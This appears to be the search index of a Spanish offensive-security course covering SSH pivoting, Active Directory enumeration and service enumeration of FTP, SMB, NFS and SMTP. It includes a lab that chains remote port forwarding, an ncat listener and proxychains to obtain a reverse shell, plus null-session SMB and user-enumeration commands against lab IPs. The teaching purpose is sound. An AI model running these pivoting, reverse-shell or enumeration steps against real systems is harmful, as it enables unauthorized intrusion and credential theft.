comunicaci\u00f3n con el servidor web de python que se est\u00e1 ejecutando en attacker</p> <p>Tarea</p> <p>Consulta este link o cualquier otro que te sea necesario para entender el concepto de remote port forwarding y ser capaz de completar el siguiente comando, que deber\u00e1 ser ejecutado en attacker:</p> <pre><code>ssh ___ :___:172.16.100.10:___ root@helper -N -f\n</code></pre> <p>Tarea</p> <p>Vuelve a realizar los pasos que hemos visto antes para ejecutar <code>poc.sh</code> y comprueba si hay alg\u00fan cambio respecto a la situaci\u00f3n anterior e indicua cu\u00e1l y por qu\u00e9.</p> <p>Ahora s\u00f3lo estamos a un peque\u00f1\u00edsimo paso de conseguir nuestra shell inversa. Necesitamos una nueva redirecci\u00f3n de puertos y lo tendremos todo listo.</p> <p>Tarea</p> <p>Documenta los pasos a seguir con la nueva redirecci\u00f3n de puertos y el \u00e9xito comprometiendo esta nueva m\u00e1quina. Elabora un diagrama en https://app.diagrams.net/ donde se vea el proceso:</p> <ol> <li><code>ssh __ :__:172.16.100.10:__ -R :__:172.16.100.10:__ root@helper -N -f</code></li> <li><code>python3 -m http.server 80</code></li> <li><code>ncat -lvnp 1331</code></li> <li><code>proxychains4 -q ./poc.sh 172.16.101.21</code></li> </ol>"},{"location":"segof/Pivoting/#cuestion","title":"Cuesti\u00f3n","text":"<p>Cuesti\u00f3n</p> <p>\u00bfC\u00f3mo podemos evitar el uso de esta t\u00e9cnica de ataque con la redirecci\u00f3n de puertos en SSH?</p> <p>Pista: Gateway ports</p> <p>Comprueba y documenta que con esta defensa, la t\u00e9cnica anteriormente empleada ya no funciona.</p>"},{"location":"segof/Pivoting/#referencias","title":"Referencias","text":"<p>SSH Tunneling: Local &amp; Remote Port Forwarding</p> <p>T\u00fanel SSH port forwarding: Local, remote y dynamic [Explicado]</p> <p>\ud83d\udee0\ufe0f Port forwarding</p> <p>Total OSCP Guide</p> <p>Networking with standalone containers</p> <p>Pivoting in Docker</p>"},{"location":"segof/ad_enumeration/","title":"Enumeraci\u00f3n en entornos AD (Active Directory)","text":""},{"location":"segof/ad_enumeration/#introduccion-a-la-fase-de-enumeracion-en-un-pentesting-de-active-directory-ad","title":"Introducci\u00f3n a la Fase de Enumeraci\u00f3n en un Pentesting de Active Directory (AD)","text":"<p>La enumeraci\u00f3n es una de las fases m\u00e1s cr\u00edticas en un pentesting en entornos Active Directory, ya que permite al atacante (o auditor de seguridad) recopilar informaci\u00f3n clave sobre el dominio y sus componentes. </p> <p>Este conocimiento se utiliza para identificar vulnerabilidades, planificar movimientos laterales y, en \u00faltima instancia, comprometer el dominio.</p>"},{"location":"segof/ad_enumeration/#que-es-la-enumeracion-en-active-directory","title":"\u00bfQu\u00e9 es la enumeraci\u00f3n en Active Directory?","text":"<p>La enumeraci\u00f3n en AD consiste en recopilar datos estructurados sobre los recursos de la red, como:</p> <ul> <li>Usuarios y grupos. </li> <li>Diferentes m\u00e1quinas y servidores. </li> <li>Relaciones de confianza entre dominios. </li> <li>Permisos y configuraciones. </li> <li>Pol\u00edticas de seguridad. </li> <li>Estos datos se obtienen utilizando protocolos y servicios est\u00e1ndar de Windows (como LDAP, SMB y Kerberos), lo que hace que muchas actividades de enumeraci\u00f3n sean dif\u00edciles de detectar sin herramientas avanzadas de monitorizaci\u00f3n.</li> </ul>"},{"location":"segof/ad_enumeration/#objetivos-de-la-enumeracion","title":"Objetivos de la enumeraci\u00f3n","text":"<ol> <li>Mapear la estructura del dominio:<ul> <li>Identificar controladores de dominio (Domain Controllers, DCs) y su configuraci\u00f3n. </li> <li>Enumerar relaciones entre dominios (dominios padres e hijos, relaciones de confianza, etc.). </li> </ul> </li> <li>Identificar cuentas cr\u00edticas:<ul> <li>Administradores del dominio. </li> <li>Cuentas de servicio y sus privilegios. </li> <li>Cuentas con contrase\u00f1as d\u00e9biles o configuraciones inseguras. </li> </ul> </li> <li>Obtener informaci\u00f3n sobre configuraciones de seguridad:<ul> <li>Pol\u00edticas de contrase\u00f1as y bloqueos. </li> <li>Grupos privilegiados y sus miembros. </li> </ul> </li> <li>Descubrir puntos d\u00e9biles:<ul> <li>Permisos mal configurados en objetos del directorio. </li> <li>Contrase\u00f1as almacenadas en texto plano o en archivos compartidos. </li> </ul> </li> </ol>"},{"location":"segof/ad_enumeration/#herramientas-y-metodos-de-enumeracion","title":"Herramientas y m\u00e9todos de enumeraci\u00f3n","text":"<ol> <li>Comandos Nativos de Windows:<ul> <li>nltest: Descubre el nombre del dominio, servidores activos y relaciones de confianza. </li> <li>net user /domain: Enumera usuarios en el dominio. </li> <li>net group /domain: Lista grupos y sus miembros. </li> <li>gpresult: Consulta las pol\u00edticas de grupo aplicadas. </li> </ul> </li> <li> <p>Uso de Protocolos:</p> <ul> <li> <p>LDAP (Lightweight Directory Access Protocol): </p> <p>\u25aa Protocolo utilizado por Active Directory para acceder a los datos. </p> <p>\u25aa Utilizado para consultar la base de datos del dominio, como cuentas de usuario y grupos. </p> </li> <li> <p>SMB (Server Message Block): </p> <p>\u25aa Enumeraci\u00f3n de recursos compartidos y pol\u00edticas de acceso. </p> </li> <li> <p>Kerberos: </p> <p>\u25aa Permite identificar servicios y cuentas relacionadas con SPNs (Service Principal Names). </p> <p>Nota</p> <p>Los SPNs (Service Principal Names) son identificadores \u00fanicos que se utilizan en entornos de Active Directory para asociar servicios a cuentas espec\u00edficas. Son esenciales para que el protocolo Kerberos funcione correctamente, ya que permiten que un cliente encuentre y autentique servicios en una red de manera segura.</p> <p>Por ejemplo:</p> <p><pre><code>HTTP/server01.example.com\nMSSQLSvc/sqlserver01.example.com:1433\n</code></pre> Cuando un cliente necesita acceder a un servicio, utiliza el SPN para solicitar un ticket de servicio (Service Ticket) al KDC (Key Distribution Center). Esto permite la autenticaci\u00f3n mutua entre el cliente y el servicio.</p> </li> </ul> </li> <li> <p>Herramientas Especializadas:</p> <ul> <li> <p>BloodHound: </p> <p>\u25aa Herramienta gr\u00e1fica que analiza relaciones de confianza, privilegios y rutas de ataque en AD. </p> <p></p> </li> <li> <p>PowerView (parte de PowerSploit): </p> <p>\u25aa Framework de enumeraci\u00f3n avanzada escrito en PowerShell. </p> <p>\u25aa Ejemplo: Get-NetUser para listar usuarios, Get-NetGroupMember para miembros de grupos. </p> <p></p> </li> <li> <p>Impacket: </p> <p>\u25aa Biblioteca de Python con herramientas como GetADUsers.py para enumerar usuarios en AD. </p> <p></p> </li> <li> <p>CrackMapExec: </p> <p>\u25aa Herramienta de enumeraci\u00f3n y explotaci\u00f3n para redes Windows. </p> <p>\u25aa Ejemplo: <code>cme smb &lt;ip&gt; -u usuario -p contrase\u00f1a --shares para listar recursos compartidos.</code></p> <p>Nota</p> <p>Ya no se encuentra activamente mantenida en su repositorio original. El proyecto fue archivado en diciembre de 2023 debido a conflictos relacionados con un \"fork hostil\". </p> <p>Sin embargo, su desarrollo contin\u00faa bajo un nuevo nombre: NetExec, que busca mantener y ampliar las capacidades de CME con actualizaciones regulares y una mayor participaci\u00f3n de la comunidad.</p> <p>NetExec, liderado por contribuidores como NeffIsBack y Marshall-Hallenbeck, se posiciona como un sucesor gratuito y de c\u00f3digo abierto. Este proyecto hereda las funcionalidades principales de CME, corrige problemas previos y est\u00e1 dise\u00f1ado para satisfacer las necesidades actuales de los pentesters con un enfoque m\u00e1s colaborativo</p> <p></p> </li> </ul> </li> <li> <p>Enumeraci\u00f3n An\u00f3nima:</p> <ul> <li>En configuraciones incorrectas, es posible obtener informaci\u00f3n sin autenticaci\u00f3n. </li> <li>Herramientas como rpcclient o enum4linux pueden explotar configuraciones d\u00e9biles de SMB. </li> </ul> </li> </ol>"},{"location":"segof/ad_enumeration/#informacion-critica-a-recopilar","title":"Informaci\u00f3n Cr\u00edtica a Recopilar","text":"<ol> <li> <p>Usuarios y Cuentas</p> <ul> <li>Usuarios del dominio: Nombres de usuarios y detalles como cuentas deshabilitadas, bloqueadas o con contrase\u00f1as nunca expiradas.</li> <li>Cuentas privilegiadas: Identificaci\u00f3n de miembros del grupo Domain Admins o Enterprise Admins.</li> <li>Cuentas de servicio: Cuentas asociadas a servicios, a menudo configuradas con permisos elevados y contrase\u00f1as d\u00e9biles o reutilizadas.</li> </ul> </li> <li> <p>Grupos y Relaciones</p> <ul> <li>Grupos del dominio: Identificaci\u00f3n de grupos administrativos y sus miembros.</li> <li>Relaciones de confianza: Enumeraci\u00f3n de relaciones entre dominios o bosques, que pueden usarse para ataques de trust exploitation.</li> <li>Pol\u00edticas de grupos (GPOs): Configuraciones que podr\u00edan revelar credenciales, rutas de inicio de sesi\u00f3n o configuraciones inseguras.</li> </ul> </li> <li> <p>Equipos y Servidores</p> <ul> <li>Controladores de dominio (DCs): Identificar servidores cr\u00edticos que gestionan el directorio.</li> <li>Servidores y estaciones de trabajo: Inventario de m\u00e1quinas del dominio y sus roles.</li> <li>Servicios expuestos: Enumerar servicios como SMB, LDAP, y RPC para posibles puntos de entrada.</li> </ul> </li> <li> <p>SPNs (Service Principal Names)</p> <ul> <li>Cuentas con SPNs registrados: Esto es fundamental para identificar posibles objetivos de ataques de Kerberoasting, donde se extraen tickets Kerberos para descifrar contrase\u00f1as.</li> </ul> </li> <li> <p>Pol\u00edticas y Configuraciones</p> <ul> <li>Pol\u00edtica de contrase\u00f1as: Reglas sobre longitud, complejidad y caducidad.</li> <li>Delegaci\u00f3n de cuentas: Detectar cuentas configuradas para delegaci\u00f3n, que pueden ser explotadas para ataques como Kerberos delegation abuse.</li> <li>Restricciones de inicio de sesi\u00f3n: Determinar si hay restricciones basadas en horarios o estaciones.</li> </ul> </li> <li> <p>Credenciales y Secretos</p> <ul> <li>Contrase\u00f1as expuestas: Buscar contrase\u00f1as almacenadas en descripciones de cuentas, GPOs o scripts.</li> <li>Hash de contrase\u00f1as: Obtener hashes para ataques de pass-the-hash o password cracking.</li> <li>Vaults o secretos en AD: Informaci\u00f3n almacenada en atributos de cuentas como description o comment.</li> </ul> </li> <li> <p>ACLs y Permisos</p> <ul> <li>Permisos personalizados: Evaluar permisos en objetos cr\u00edticos del dominio (usuarios, grupos, pol\u00edticas) para detectar posibles vulnerabilidades.</li> <li>Permisos delegados: Identificar delegaciones inseguras que permitan la elevaci\u00f3n de privilegios.</li> </ul> </li> <li> <p>Relaciones de Red</p> <ul> <li>Sesiones activas: Identificar conexiones entre usuarios y m\u00e1quinas que podr\u00edan usarse para ataques de lateral movement.</li> <li>Mapeo de subredes: Conocer las segmentaciones internas del dominio para planificar movimientos.</li> </ul> </li> </ol>"},{"location":"segof/ad_enumeration/#riesgos-comunes-durante-la-enumeracion","title":"Riesgos Comunes Durante la Enumeraci\u00f3n","text":"<ol> <li>Detecci\u00f3n por parte de sistemas SIEM o EDR:<ul> <li>Consultas excesivas o escaneos podr\u00edan activar alarmas. </li> <li>Herramientas como BloodHound pueden generar tr\u00e1fico sospechoso. </li> </ul> </li> <li>Interacci\u00f3n con configuraciones sensibles:<ul> <li>Algunos comandos podr\u00edan impactar en los servicios o generar logs innecesarios. </li> </ul> </li> <li>Falta de contexto en la interpretaci\u00f3n de resultados:<ul> <li>No todas las configuraciones identificadas como d\u00e9biles son explotables sin contexto adicional. </li> </ul> </li> </ol>"},{"location":"segof/ad_enumeration/#conclusion","title":"Conclusi\u00f3n","text":"<p>La fase de enumeraci\u00f3n en un pentesting de Active Directory es fundamental para mapear el entorno y descubrir posibles rutas de ataque. Un enfoque met\u00f3dico, combinado con herramientas potentes como BloodHound y PowerView, permite maximizar la recolecci\u00f3n de datos mientras se minimiza el riesgo de detecci\u00f3n.</p>"},{"location":"segof/enumeracion/","title":"Enumeraci\u00f3n de servicios","text":"<p>Para esta sesi\u00f3n, vamos a ver una serie de mecanimos a la hora de enumerar los servicios m\u00e1s comunes que nos podemos encontrar en nuestro proceso de pentesting.</p>"},{"location":"segof/enumeracion/#ftp","title":"FTP","text":"<p>FTP (File Transfer Protocol) es un protocolo de red est\u00e1ndar utilizado para la transferencia de archivos entre un cliente y un servidor en una red TCP/IP, como Internet.</p> <p>Fue dise\u00f1ado para permitir la carga y descarga de archivos.</p> <p>Caracter\u00edsticas principales de FTP:</p> <ul> <li>Autenticaci\u00f3n: Requiere usuario y contrase\u00f1a para acceder al servidor, aunque tambi\u00e9n puede configurarse en modo \"an\u00f3nimo\" (sin autenticaci\u00f3n) para permitir el acceso p\u00fablico.</li> <li>Transferencias de archivos: Permite enviar y recibir archivos desde y hacia un servidor.</li> <li>Gesti\u00f3n de archivos: Soporta comandos para manejar archivos y directorios en el servidor, como crear, renombrar, eliminar y listar archivos y carpetas.</li> <li>Conexi\u00f3n de control y datos: FTP utiliza dos conexiones separadas: una para el control (comandos y respuestas) y otra para la transferencia de datos.</li> <li>Seguridad: La versi\u00f3n b\u00e1sica de FTP no cifra los datos, por lo que no es segura para transmitir informaci\u00f3n confidencial. Sin embargo, existen versiones seguras, como FTPS (FTP sobre SSL/TLS) y SFTP (Secure File Transfer Protocol, que usa el protocolo SSH) que proporcionan cifrado y mayor seguridad.</li> </ul>"},{"location":"segof/enumeracion/#uso-comun-de-ftp","title":"Uso com\u00fan de FTP:","text":"<p>FTP es com\u00fan en aplicaciones de administraci\u00f3n de servidores web, donde se usa para cargar y descargar archivos del sitio web, hacer copias de seguridad y gestionar datos.</p> <p>Es adecuado para transferencias grandes, pero, dado que no es seguro de forma predeterminada, suele utilizarse en redes de confianza o con versiones seguras (FTPS o SFTP).</p>"},{"location":"segof/enumeracion/#tftp","title":"TFTP","text":"<p>TFTP (Trivial File Transfer Protocol) es un protocolo de red simple dise\u00f1ado para la transferencia de archivos en redes TCP/IP. A diferencia de FTP, TFTP es muy b\u00e1sico y no tiene autenticaci\u00f3n ni encriptaci\u00f3n, lo que lo hace menos seguro pero adecuado para situaciones donde la simplicidad y rapidez son prioritarias. Caracter\u00edsticas principales de TFTP:</p> <ul> <li>Protocolo ligero: TFTP est\u00e1 dise\u00f1ado para realizar transferencias de archivos de forma muy sencilla, con un conjunto m\u00ednimo de comandos.</li> <li>Sin autenticaci\u00f3n: No requiere usuario ni contrase\u00f1a, lo cual simplifica su uso pero reduce la seguridad.</li> <li>Sin encriptaci\u00f3n: La falta de cifrado hace que cualquier archivo transferido sea vulnerable a ser interceptado.</li> <li>Basado en UDP: TFTP usa el protocolo UDP (en el puerto 69), lo que hace que las transferencias sean r\u00e1pidas pero sin confirmaci\u00f3n de entrega completa o control de errores exhaustivo.</li> <li>Operaciones b\u00e1sicas: Permite solamente leer y escribir archivos desde o hacia un servidor; no tiene comandos para listar directorios, renombrar o eliminar archivos.</li> </ul>"},{"location":"segof/enumeracion/#uso-comun-de-tftp","title":"Uso com\u00fan de TFTP","text":"<p>Dado que es un protocolo no seguro, TFTP se utiliza en redes locales o en entornos controlados. Es com\u00fanmente empleado para tareas como:</p> <ul> <li>Carga y actualizaci\u00f3n de configuraciones en dispositivos de red (como routers, switches y puntos de acceso).</li> <li>Actualizaci\u00f3n de firmware en equipos que lo soportan.</li> <li>Arranque remoto de sistemas en redes locales (por ejemplo, usando PXE para arrancar computadoras sin disco duro).</li> </ul> <p>En resumen, TFTP es un protocolo \u00fatil para transferencias r\u00e1pidas y simples en entornos seguros y confiables, donde la seguridad avanzada y el control de archivos no son necesarios.</p>"},{"location":"segof/enumeracion/#tecnicas-de-enumeracion-ftp","title":"T\u00e9cnicas de enumeraci\u00f3n FTP","text":""},{"location":"segof/enumeracion/#obteniendo-la-version","title":"Obteniendo la versi\u00f3n","text":"<pre><code>nmap -sV -p21,2121 192.168.100.129\n</code></pre> <p>Haciendo uso del script banner de nmap:</p> <pre><code>nmap -sV -p21,2121 -sC banner 192.168.100.129\n</code></pre> <p>O incluso, intentando conectarnos directamente via Telnet;</p> <pre><code>telnet 192.168.100.129 21\n</code></pre> <p>Podemos lanzar los scripts relacionados con FTP que posee nmap:</p> <pre><code>nmap -sV -p21,2121 -sC \"ftp*\" 192.168.100.129\n</code></pre> <p>Si se permite el login an\u00f3nimo podr\u00edamos acceder al servidor y descargar contenido:</p> <pre><code>ftp 192.168.100.129\n\nget &lt;archivo&gt;\n</code></pre>"},{"location":"segof/enumeracion/#smb","title":"SMB","text":"<p>SMB (Server Message Block) es un protocolo de red utilizado principalmente para compartir archivos, impresoras y recursos en una red local (LAN). Fue desarrollado originalmente por IBM y posteriormente extendido y popularizado por Microsoft. Este protocolo permite que dispositivos de una red, como computadoras y servidores, accedan y administren archivos de forma compartida, adem\u00e1s de facilitar otras funciones de comunicaci\u00f3n entre equipos. Principales caracter\u00edsticas de SMB</p> <ul> <li> <p>Intercambio de archivos: SMB permite que varios usuarios accedan y manipulen archivos almacenados en servidores o computadoras de una red, ofreciendo servicios como abrir, leer, escribir, y cerrar archivos de forma remota.</p> </li> <li> <p>Impresi\u00f3n remota: Adem\u00e1s de archivos, SMB facilita el uso de impresoras en red. Con este protocolo, es posible enviar documentos a una impresora conectada a otro dispositivo en la red.</p> </li> <li> <p>Autenticaci\u00f3n y permisos: SMB incluye mecanismos de autenticaci\u00f3n y permisos que permiten a los administradores controlar qui\u00e9n puede acceder a ciertos archivos o recursos. Esto es importante para la seguridad, especialmente en redes empresariales.</p> </li> </ul> <p>Versiones de SMB</p> <ul> <li>SMBv1: La primera versi\u00f3n ampliamente usada de SMB, que inclu\u00eda vulnerabilidades como las explotadas en el ataque de ransomware WannaCry.</li> <li>SMBv2 y SMBv3: Estas versiones mejoraron la eficiencia y seguridad del protocolo, reduciendo la vulnerabilidad a ciertos tipos de ataques y a\u00f1adiendo soporte para cifrado.</li> </ul>"},{"location":"segof/enumeracion/#usos-de-smb-en-la-seguridad-informatica","title":"Usos de SMB en la seguridad inform\u00e1tica","text":"<p>SMB es importante en la seguridad inform\u00e1tica porque, si no se configura correctamente, puede ser vulnerable a ataques. Los atacantes pueden aprovechar conexiones SMB abiertas o mal configuradas para acceder a archivos, instalar malware o ejecutar ataques como SMB relay o brute force en el contexto de redes corporativas.</p> <p>Nmap, por ejemplo, ofrece scripts como smb-enum-shares o smb-os-discovery que permiten detectar y explorar servicios SMB en redes para evaluar su seguridad.</p>"},{"location":"segof/enumeracion/#tecnicas-de-enumeracion-smb","title":"T\u00e9cnicas de enumeraci\u00f3n SMB","text":"<p>Existen m\u00faltiples herramientas para llevar a cabo la enumeraci\u00f3n de este servicio. Todas ellas nos permiten, como se puede intuir leyendo el t\u00edtulo de la secci\u00f3n, la enumeraci\u00f3n y recopilaci\u00f3n de todo tipo de informaci\u00f3n sobre el servicio SMB para, m\u00e1s adelante, pasar a la fase de explotaci\u00f3n haciendo uso de la misma.</p> <p>Algunas de las herramientas m\u00e1s conocidas y utilizadas son:</p> <ul> <li>nbtscan: permite escanear servicios NetBIOS, entre ellos SMB.</li> <li>smbap: es una herramienta de c\u00f3digo abierto dise\u00f1ada para facilitar la enumeraci\u00f3n y el acceso a recursos compartidos en redes que utilizan el protocolo SMB (Server Message Block). Es especialmente \u00fatil para realizar auditor\u00edas de seguridad y pruebas de penetraci\u00f3n en entornos de Windows. SMBMap permite a los usuarios explorar y verificar los permisos de acceso a los recursos compartidos en dispositivos que utilizan SMB, lo que puede ayudar a identificar vulnerabilidades o configuraciones inseguras.</li> <li>nmap: tambi\u00e9n posee scripts espec\u00edficos para SMB</li> <li>smbclient: es una herramienta de l\u00ednea de comandos utilizada para interactuar con servidores que implementan el protocolo SMB (Server Message Block). Forma parte del paquete de software Samba, que permite a sistemas operativos basados en Unix y Linux comunicarse con redes de Windows y acceder a recursos compartidos, como archivos e impresoras. smbclient act\u00faa como un cliente FTP para recursos compartidos de SMB, permitiendo la navegaci\u00f3n, el acceso y la manipulaci\u00f3n de archivos.</li> <li>rpcclient: es una herramienta de l\u00ednea de comandos que forma parte del paquete Samba, dise\u00f1ada para interactuar con el servicio Remote Procedure Call (RPC) de sistemas que utilizan el protocolo SMB (Server Message Block). Esta herramienta permite a los usuarios realizar una variedad de tareas administrativas y de gesti\u00f3n de red en servidores que implementan el servicio RPC, que es com\u00fan en sistemas Windows.</li> <li>enum4linux: que no es m\u00e1s que una metaherramienta que combina informaci\u00f3n obtenida de smbclient, rpclient, net y nmblookup.</li> </ul> <p>Si queremos comenzar a enumerar con una herramienta ya conocida, como es nmap, lanzando los scripts default, podemos hacer:</p> <p><pre><code>nmap -sC -p 139,445 -sV 192.168.100.129\n</code></pre> Y obtendremos informaci\u00f3n como la versi\u00f3n de samba y veremos como la ngeociaci\u00f3n de Samba versi\u00f3n 2 (SMBv2) ha resultado fallida, por lo que extraemos que quiz\u00e1s se est\u00e9 utilizando el inseguro SMBv1.</p> <p>Otros scripts que se pueden utilizar con nmap para SMB son: + smb-protocols: descubrir que versiones maneja la v\u00edctima (&lt;SMBv3 ser\u00eda vulnerable) + smb-os-discovery + smb-enum-shares + smb-enum-users + smb-vuln-*: para probar vulnerabilidades concretas de SMB</p> <p>Con smbmap obtendremos una lista de shares:</p> <p><pre><code>smbmap -H 192.168.100.129 -R\n</code></pre> Seg\u00fan la ayuda de smbmap, textualmente:</p> <p>Quote</p> <p>Main arguments:</p> <pre><code>-H HOST               IP of host\n--host-file FILE      File containing a list of hosts\n-u USERNAME           Username, if omitted null session assumed\n-p PASSWORD           Password or NTLM hash\n-s SHARE              Specify a share (default C$), ex 'C$'\n-d DOMAIN             Domain name (default WORKGROUP)\n-P PORT               SMB port (default 445)\n-v                    Return the OS version of the remote host\n--admin               Just report if the user is an admin\n</code></pre> <p>Y si quisi\u00e9ramos conectarnos directamente al servidor, podr\u00edamos usar smbclient. Para listar los shares usando una sesi\u00f3n nula (sin credenciales):</p> <p><pre><code>smbclient -N -L //192.168.100.129\n</code></pre> Y si quisi\u00e9ramos acceder al servidor y movernos por los directorios:</p> <pre><code>smbclient //192.168.100.129/tmp\n</code></pre> <p>Tambi\u00e9n con la herramiento rpclient podemos ejecutar diversas peticiones para obtener informaci\u00f3n sobre SMB tras conectarnos al servidor:</p> <p><pre><code>rpcclient -U \"\" 192.168.100.129\n</code></pre> Algunas de las peticiones que podemos hacer;</p> Petci\u00f3n Descripci\u00f3n srvinfo Informaci\u00f3n del servidor enumdomains Enumerar todos los dominios desplegados en la red querydominfo Proporciona dominio, servidor e informaci\u00f3n de usuario de los dominios existentes domains. netshareenumall Enumera los shares disponibles netsharegetinfo  Informaci\u00f3n acerca de alg\u00fan share espec\u00edfico enumdomusers Enumera usuarios del dominio queryuser  Proporciona informaci\u00f3n sobre un usuario concreto <p>Y, como ya comnent\u00e1bamos, podr\u00edamos obtener una salida combinada con enum4linux:</p> <pre><code>enum4linux 192.168.100.129 -A\n</code></pre>"},{"location":"segof/enumeracion/#nfs","title":"NFS","text":"<p>NFS (Network File System) es un protocolo de red que permite compartir archivos entre computadoras en una red de manera que los usuarios puedan acceder a ellos como si estuvieran en su sistema local. Fue desarrollado originalmente por Sun Microsystems en la d\u00e9cada de 1980 y se ha convertido en un est\u00e1ndar ampliamente utilizado, especialmente en sistemas Unix y Linux, aunque tambi\u00e9n es compatible con otros sistemas operativos. Principales caracter\u00edsticas de NFS:</p> <ul> <li> <p>Transparencia: Los archivos y directorios compartidos a trav\u00e9s de NFS aparecen en la red como parte del sistema de archivos local. Esto permite que los usuarios accedan a archivos remotos sin necesidad de moverlos o copiarlos.</p> </li> <li> <p>Arquitectura cliente-servidor: NFS sigue un modelo en el que un servidor central aloja los archivos y los distribuye a los clientes que se conectan a \u00e9l. Los clientes pueden montar los sistemas de archivos del servidor en su propio sistema y trabajar con los archivos directamente.</p> </li> <li> <p>Protocolos de red: NFS utiliza t\u00edpicamente el protocolo TCP/IP para la transmisi\u00f3n de datos en la red. Tambi\u00e9n puede emplear otros protocolos de seguridad, como Kerberos, para autenticaci\u00f3n y cifrado.</p> </li> <li> <p>Permisos y control de acceso: NFS ofrece control de acceso mediante permisos de archivos Unix (propiedad, grupo y permisos de lectura, escritura y ejecuci\u00f3n) y se puede integrar con otros sistemas de autenticaci\u00f3n y seguridad.</p> </li> <li> <p>Compatibilidad y escalabilidad: Es compatible con varios sistemas operativos y permite que varias m\u00e1quinas se conecten a los archivos compartidos, haci\u00e9ndolo ideal para redes de oficina y entornos de computaci\u00f3n distribuida.</p> </li> </ul>"},{"location":"segof/enumeracion/#ejemplos-de-uso-de-nfs","title":"Ejemplos de uso de NFS","text":"<ul> <li>Almacenamiento compartido en servidores: Permite que varias m\u00e1quinas accedan a una misma base de datos o sistema de archivos.</li> <li>Entornos de desarrollo: Facilita la colaboraci\u00f3n entre desarrolladores, permitiendo el acceso a los mismos archivos desde m\u00faltiples dispositivos.</li> <li>Virtualizaci\u00f3n y contenedores: En entornos donde se crean instancias de contenedores o m\u00e1quinas virtuales, NFS permite almacenar archivos de configuraci\u00f3n y datos de manera centralizada.</li> </ul> <p>NFS es una soluci\u00f3n eficiente y robusta para compartir archivos en redes internas de manera segura y escalable.</p>"},{"location":"segof/enumeracion/#como-funciona-nfs","title":"\u00bfC\u00f3mo funciona NFS?","text":"<p>Primero, el cliente solicitar\u00e1 montar un directorio de un host remoto en un directorio local de la misma manera que puede montar un dispositivo f\u00edsico. El servicio de montaje actuar\u00e1  entonces para conectarse al demonio de montaje correspondiente mediante RPC. </p> <p>El servidor comprueba si el usuario tiene permiso para montar el directorio solicitado. A continuaci\u00f3n devolver\u00e1 un manejador de fichero que identifica un\u00edvocamente cada fichero y directorio  que est\u00e1 en el servidor.</p> <p>Si alguien quiere acceder a un archivo utilizando NFS, se realiza una llamada RPC a NFSD (el demonio NFS) en el servidor. Esta llamada toma par\u00e1metros como:</p> <ul> <li>El manejador del archivo</li> <li>El nombre del archivo al que se quiere acceder</li> <li>ID de usuario del usuario</li> <li>El ID de grupo del usuario</li> </ul> <p>Estos datos se utilizan para determinar los derechos de acceso al archivo especificado. Esto es lo que controla los permisos de usuario, es decir, la lectura y escritura de archivos.</p>"},{"location":"segof/enumeracion/#ejemplo-de-enumeracion-de-nfs","title":"Ejemplo de enumeraci\u00f3n de NFS","text":"<p>El primer paso es como siempre, realizar un escaneo general de la m\u00e1quina:</p> <pre><code>nmap -p- -sT -T5 10.10.192.87   </code></pre> <p>Cuando descubrimos que existe un servicio NFS, podemos listar las comparticiones visibles con: <pre><code>showmount -e 10.10.192.87\n</code></pre></p> <p>Nos creamos un directorio ad-hoc y montamos el share que hemos visto anteriormente:</p> <pre><code>mkdir /tmp/mount\n\nsudo mount -t nfs 10.10.192.87:home /tmp/mount/ -nolock\n</code></pre>"},{"location":"segof/enumeracion/#smtp","title":"SMTP","text":"<p>SMTP (Simple Mail Transfer Protocol) es un protocolo de comunicaci\u00f3n usado para enviar correos electr\u00f3nicos a trav\u00e9s de redes de internet. Es fundamental en la transmisi\u00f3n de mensajes de correo entre servidores de correo electr\u00f3nico y desempe\u00f1a un papel clave en el sistema de correo electr\u00f3nico.</p>"},{"location":"segof/enumeracion/#funcionamiento-basico-de-smtp","title":"Funcionamiento b\u00e1sico de SMTP","text":"<ol> <li>Env\u00edo del correo: Cuando un usuario env\u00eda un correo, su cliente de correo (como Outlook o Gmail) usa SMTP para enviar el mensaje al servidor de correo saliente.</li> <li>Transferencia entre servidores: El servidor de correo del remitente utiliza SMTP para entregar el mensaje al servidor de correo del destinatario. </li> <li>Recepci\u00f3n del correo: Una vez que el servidor del destinatario recibe el mensaje, el usuario puede leerlo a trav\u00e9s de protocolos de recepci\u00f3n como IMAP o POP3.</li> </ol>"},{"location":"segof/enumeracion/#caracteristicas-clave-de-smtp","title":"Caracter\u00edsticas clave de SMTP","text":"<ul> <li>Conexi\u00f3n: Opera en el puerto 25 (aunque tambi\u00e9n usa 465 o 587 para conexiones seguras).</li> <li>Simples comandos y respuestas: Utiliza comandos b\u00e1sicos, como <code>HELO</code>, <code>MAIL</code>, <code>RCPT</code>, y <code>DATA</code>, para establecer la conexi\u00f3n y transmitir el mensaje.</li> <li>Textos sin formato: SMTP fue dise\u00f1ado para enviar mensajes de texto sin formato; para enviar contenido multimedia, se usa una codificaci\u00f3n adicional (como MIME).</li> </ul> <p>SMTP es uno de los protocolos de red m\u00e1s antiguos y sigue siendo el est\u00e1ndar para enviar correos electr\u00f3nicos hoy en d\u00eda.</p>"},{"location":"segof/enumeracion/#enumeracion-smtp","title":"Enumeraci\u00f3n SMTP","text":"<p>Iniciamos, como casi siempre, la enumeraci\u00f3n con un escaneo con nmap</p> <pre><code>nmap -p- -sT -T5 10.10.192.87   </code></pre> <p>Si descubrimos un servidor SMTP (puerto 25 por defecto), podemos por ejemplo enumerar usuarios con alg\u00fa nombre o lista que hayamos recolectado previamente:</p> <pre><code>smtp-user-enum -M VRFY -u admin -t 10.10.192.87\n\nsmtp-user-enum -M VRFY -U lista_usuarios.txt -t 10.10.192.87\n</code></pre> <p>Podemos intentar ver qu\u00e9 comandos se nos permiten para interactuar con el servidor de correo o descubrir si es un open-relay:</p> <pre><code>nmap -p25 --script smtp-commands 10.10.192.87\nnmap -p25 --script smtp-open-relay 10.10.192.87 -v\n</code></pre>"},{"location":"segof/exploit/","title":"Teor\u00eda sobre exploits","text":""},{"location":"segof/exploit/#que-es-un-exploit","title":"\u00bfQu\u00e9 es un exploit?","text":"<p>Un exploit es un programa o fragmento de c\u00f3digo dise\u00f1ado para encontrar y aprovechar un fallo o vulnerabilidad de seguridad en una aplicaci\u00f3n o sistema inform\u00e1tico, generalmente con fines maliciosos, como instalar malware. </p> <p>Un exploit no es un malware en s\u00ed mismo, sino que es un m\u00e9todo utilizado por los ciberdelincuentes para distribuir malware.</p>"},{"location":"segof/exploit/#tipos-de-exploits","title":"Tipos de exploits","text":""},{"location":"segof/exploit/#exploits-conocidos","title":"Exploits conocidos","text":"<p>Una vez que un exploit se da a conocer a los autores del software afectado, la vulnerabilidad a menudo se soluciona mediante un parche para inutilizar el exploit. </p> 